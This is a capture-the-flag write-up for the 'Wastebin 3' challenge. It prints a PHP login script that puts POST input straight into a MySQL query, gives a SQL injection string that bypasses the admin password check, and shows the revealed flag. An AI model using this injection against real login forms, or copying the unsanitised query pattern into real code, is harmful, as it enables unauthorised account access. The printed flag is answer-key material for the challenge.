---
layout: writeup
title: Wastebin 3
level: 
difficulty: 
points: 
categories: []
tags: []
flag: easyctf{54771309-67e5-4704-8743-6981a40b}
---
**Challenge**  
Hey I just learned this thing called MySQL! My admin account should be
safe now! Link

## Solution

We again have access to the source code

      <?php
    
            error_reporting(0);
    
            if (isset($_POST['submit']) && isset($_POST['username']) && isset($_POST['password']) && $_POST['submit'] == "Login!") {
                $username = $_POST['username'];
                $password = $_POST['password'];
                include("functions.php"); // connect to mysql server
    
                $query = "SELECT * FROM `users` WHERE username='$username' AND password='$password'";
                $result = mysql_query($query);
                $rows = array();
                while($row = mysql_fetch_array($result)) {
                    $rows[] = $row;
                }
                if (count($rows) != 1) {
                    echo "<div class='alert alert-danger'>No accounts found with that username. <a href='index.php'>Try again?</a></div>";
                } else {
                    $row = $rows[0];
                    echo "<div class='alert alert-success'>Welcome, <code>" . $row['username'] . "</code>! ";
                    if ($row['username'] == "admin") {
                        echo "Your flag is <code>$flag</code>.";
                    }
                    echo "</div>";
                }
    
            } else {
                ?>
{: .language-php}

We see that user input is used in the query as-is, so we can enter
something like this to skip the password check and still have a valid
query string:

    username = admin' or 'x'='x;--
    password = <anything>
^

    Welcome, admin! Your flag is easyctf{54771309-67e5-4704-8743-6981a40b}.

